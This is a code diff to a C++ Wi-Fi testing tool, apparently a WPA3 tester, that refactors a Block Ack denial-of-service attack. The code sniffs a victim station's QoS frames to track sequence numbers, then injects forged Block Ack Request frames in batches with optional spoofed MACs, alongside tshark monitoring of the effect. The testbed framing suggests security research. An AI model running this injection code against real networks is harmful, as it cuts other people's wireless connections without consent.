@@ -5,7 +5,6 @@
 #include <random>
 #include <chrono>
 #include <thread>
-#include <mutex>
 #include <condition_variable>
 #include <memory>
 
@@ -52,69 +51,46 @@ namespace wpa3_tester::bl0ck_attack{
         };
         const RadioTap rt{}; // fill with driver?
         return rt / ba / RawPDU(payload_data);
+    }
+
+    struct BARSContext {
+        atomic<uint16_t> current_sn{0};
+        atomic<uint8_t>  current_fn{0};
+        atomic<bool>     has_sn{false};
+        atomic<bool>     stop{false};
     };
 
-    //FIXME this have to be continuous to get new valid SSN
-    RadioTap get_BARS_frame(const HWAddress<6> &ap_hw,
-                    const HWAddress<6> &sta_hw,
-                    const string& iface,
-                    const int timeout_sec) {
+    static void bars_sniffer_thread(
+        const HWAddress<6>& sta_hw,
+        const string& iface,
+        BARSContext& ctx,
+        const int timeout_sec)
+    {
+        const string filter = "wlan type data subtype qos-data and wlan addr2 " + sta_hw.to_string();
 
-        log(LogLevel::INFO, "BARS: Starting sniffer for %s (timeout: %ds)",
-            sta_hw.to_string().c_str(), timeout_sec);
+        components::poll_sniffer_pdu<monostate>(
+            [&](PDU& pdu) -> optional<monostate> {
+                if (ctx.stop.load()) return monostate{};
 
-        SnifferConfiguration config;
-        config.set_immediate_mode(true);
-        config.set_timeout(100);
-        config.set_promisc_mode(true);
-        config.set_filter("wlan type data  subtype qos-data and wlan addr2 "+sta_hw.to_string());
+                const auto* qos = pdu.find_pdu<Dot11QoSData>();
+                if (!qos) return nullopt;
 
-        Sniffer sniffer(iface, config);
-        const auto start_time = steady_clock::now();
-        uint8_t found_fn = 0;
-        uint16_t found_sn = 0;
-        bool found = false;
-
-        while (true) {
-            const auto now = steady_clock::now();
-            if (duration_cast<seconds>(now - start_time).count() >= timeout_sec) {
-                break;
-            }
-
-            const unique_ptr<PDU> pdu(sniffer.next_packet());
-
-            if (!pdu) continue;
-
-            if (const auto* dot11 = pdu->find_pdu<Dot11>()) {
-                log(LogLevel::DEBUG, "BARS: Packet from to %s",
-                    dot11->addr1().to_string().c_str());
-            }
-
-            try {
-                if (const auto* qos = pdu->find_pdu<Dot11QoSData>()) {
-                    found_fn = qos->frag_num();
-                    found_sn = (qos->seq_num() + 16) % 4096; // qos->seq_num();
-                    found = true;
-                    log(LogLevel::INFO, "BARS: Captured QoS data! SN: %u, FN: %u", found_sn, found_fn);
-                    break;
-                }
-            } catch (const exception& e) {
-                log(LogLevel::WARNING, "BARS: Error parsing: %s", e.what());
-            }
-        }
-
-        if (!found) {
-            throw runtime_error("BARS: Timeout waiting for QoS data from " + sta_hw.to_string());
-        }
-
-        return get_BAR_frame(ap_hw, sta_hw, found_fn, found_sn);
+                const uint16_t sn = (qos->seq_num() + 16) % 4096;
+                const uint8_t  fn = qos->frag_num();
+                ctx.current_sn.store(sn);
+                ctx.current_fn.store(fn);
+                ctx.has_sn.store(true);
+                log(LogLevel::DEBUG, "BARS: Updated SSN=%u FN=%u", sn, fn);
+                return nullopt; // continue
+            },
+            iface, filter, timeout_sec);
     }
 
 
     void block(const string& STA_mac,
                const string& AP_mac,
                const string& iface,
-               const int frame_num,
+               const int frame_in_batch,
                const string& attack_type,
                const int duration_sec,
                const bool is_random) {
@@ -126,17 +102,20 @@ namespace wpa3_tester::bl0ck_attack{
         const HWAddress<6> ap_hw(AP_mac);
         PacketSender sender;
 
-        log(LogLevel::INFO, "Sending frames - Duration: %d sec, Concurrent frames: %d", duration_sec, frame_num);
+        log(LogLevel::INFO, "Sending frames - Duration: %d sec, Concurrent frames: %d", duration_sec, frame_in_batch);
+
+        BARSContext bars_ctx;
+        // ReSharper disable once CppTooWideScope // if in BARS if, join after emplace
+        optional<jthread> sniffer_thread;
+        if (attack_type == "BARS") {
+            const HWAddress<6> sta_hw(STA_mac);
+            sniffer_thread.emplace([&]{
+                bars_sniffer_thread(sta_hw, iface, bars_ctx, duration_sec);
+            });
+        }
 
         const auto start_time = steady_clock::now();
         const auto end_time = start_time + seconds(duration_sec);
-
-        RadioTap bars_frame;
-        /*if (attack_type == "BARS") {
-            const HWAddress<6> sta_hw = is_random ? HWAddress<6>(hw_capabilities::rand_mac()) : HWAddress<6>(STA_mac);
-            bars_frame = get_BARS_frame(ap_hw, sta_hw, iface, 10);
-            log(LogLevel::INFO, "BARS: Frame prepared with captured sequence number");
-        }*/
 
         int iteration = 0;
         while (steady_clock::now() < end_time) {
@@ -144,12 +123,14 @@ namespace wpa3_tester::bl0ck_attack{
                 const HWAddress<6> sta_hw = is_random ? HWAddress<6>(hw_capabilities::rand_mac()) : HWAddress<6>(STA_mac);
                 RadioTap block_frame;
 
-                if (attack_type == "BAR") {block_frame = get_BAR_frame(ap_hw, sta_hw);}
-                if (attack_type == "BA") {block_frame = get_BA_frame(ap_hw, sta_hw);}
-                if (attack_type == "BARS") {block_frame = get_BARS_frame(ap_hw, sta_hw, iface, 10);}
+                if (attack_type == "BAR") block_frame = get_BAR_frame(ap_hw, sta_hw);
+                if (attack_type == "BA") block_frame = get_BA_frame(ap_hw, sta_hw);
+                if (attack_type == "BARS") block_frame = get_BAR_frame(ap_hw, sta_hw,
+                                                    bars_ctx.current_fn.load(),
+                                                    bars_ctx.current_sn.load());
 
                 log(LogLevel::DEBUG, "Sending batch %d", iteration);
-                for (int i = 0; i < frame_num; ++i) sender.send(block_frame, iface_obj);
+                for (int i = 0; i < frame_in_batch; ++i) sender.send(block_frame, iface_obj);
                 this_thread::sleep_for(100ms);
                 iteration++;
             } catch (const exception& e) {
@@ -167,10 +148,7 @@ namespace wpa3_tester::bl0ck_attack{
     };
 
     static string bpf_mac_at(const int offset, const string &mac) {
-        // BPF cant filter 6 bytes at one filters //TODO
-        // 4 byte: wlan[offset:4]
-        // 2 byte: wlan[offset+4:2]
-
+        // BPF cant filter 6 bytes at one filters
         unsigned int b[6];
         sscanf(mac.c_str(), "%x:%x:%x:%x:%x:%x", &b[0],&b[1],&b[2],&b[3],&b[4],&b[5]);
 
@@ -183,15 +161,14 @@ namespace wpa3_tester::bl0ck_attack{
     }
 
     static string bpf_mac_ra_or_ta(const string &mac) {
-        //TODO nemá tu být &&
+        // offset 4 -> receiver address
+        // offset 10 -> transmitter address
         return "("+bpf_mac_at(4, mac)+" or "+bpf_mac_at(10, mac)+")";
     }
 
-    void speed_observation_start(RunStatus &rs){
-        //observer::start_mausezahn(rs, "mz_gen", "client", "access_point");
-
-        const string c_mac = rs.get_actor("client")["mac"];
-        const string a_mac = rs.get_actor("attacker")["mac"];
+    void speed_observation_start(RunStatus& rs) {
+        const string c_mac  = rs.get_actor("client")["mac"];
+        const string a_mac  = rs.get_actor("attacker")["mac"];
         const string ap_mac = rs.get_actor("access_point")["mac"];
 
         const string mac_filter =
@@ -208,10 +185,8 @@ namespace wpa3_tester::bl0ck_attack{
         bpf_mac_ra_or_ta(a_mac) +" or " +
         bpf_mac_ra_or_ta(ap_mac) +"))";
 
-        observer::start_tshark(rs, "attacker", mac_filter); //FIXME
-        observer::start_tshark(rs, "client", mac_filter); //FIXME
-        //observer::start_tshark(rs, "access_point", mac_filter);
-        //iperf_conn(rs, "client",  "access_point");
+        observer::start_tshark(rs, "attacker", mac_filter);
+        observer::start_tshark(rs, "client",   mac_filter);
         rs.start_observers();
     }
 
@@ -226,15 +201,15 @@ namespace wpa3_tester::bl0ck_attack{
 
         const string bl0ck_att_type = att_cfg.at("attack_variant").get<string>();
         const int duration = att_cfg.at("attack_time_sec").get<int>();
-        const int frame_num = att_cfg.at("frame_number").get<int>();
+        const int frame_in_batch = att_cfg.at("frame_in_batch").get<int>();
         const bool is_random = att_cfg.at("random").get<bool>();
 
         speed_observation_start(rs);
 
-        log(LogLevel::INFO, "Block Attack START (Type: %s, Frames: %d)", bl0ck_att_type.c_str(), frame_num);
-        this_thread::sleep_for(seconds(10));
-        block(STA_mac, AP_mac, iface, frame_num, bl0ck_att_type, duration, is_random);
-        this_thread::sleep_for(seconds(10));
+        log(LogLevel::INFO, "Block Attack START (Type: %s, Frames: %d)", bl0ck_att_type.c_str(), frame_in_batch);
+        this_thread::sleep_for(seconds(5));
+        block(STA_mac, AP_mac, iface, frame_in_batch, bl0ck_att_type, duration, is_random);
+        this_thread::sleep_for(seconds(5));
         log(LogLevel::INFO, "Block Attack END");
     }
 
@@ -250,13 +225,16 @@ namespace wpa3_tester::bl0ck_attack{
             observer::get_tshark_events(rs, "attacker", "wlan.fc.type_subtype == 0x000d", "ADDBA"),
             "ADDBA", "blue"});
         events.push_back({
+            observer::get_tshark_events(rs, "attacker", "wlan.fixed.action_code == 0x02", "DELBA"),
+           "DELBA", "blue"});
+        events.push_back({
             observer::get_tshark_events(rs, "attacker",
-                "(wlan.fc.type_subtype == 0x0018) && (wlan.fixed.ssc.fragment == 4)","BA_fn4"),
-            "BA_fn4", "cyan"});
-        /*events.push_back({
+                "(wlan.fc.type_subtype == 0x0018) && (wlan.fixed.ssc.fragment == 4)","BAR_fn4"),
+            "BAR_fn4", "cyan"});
+        events.push_back({
           observer::get_tshark_events(rs, "attacker",
               "(wlan.fc.type_subtype == 0x0019) && (wlan.fixed.ssc.fragment == 4)","BA_fn4")
-          ,"BA_fn4","purple"});*/
+          ,"BA_fn4","purple"});
 
         observer::tshark_graph(rs, "attacker", events);
         observer::tshark_graph(rs, "client", events);
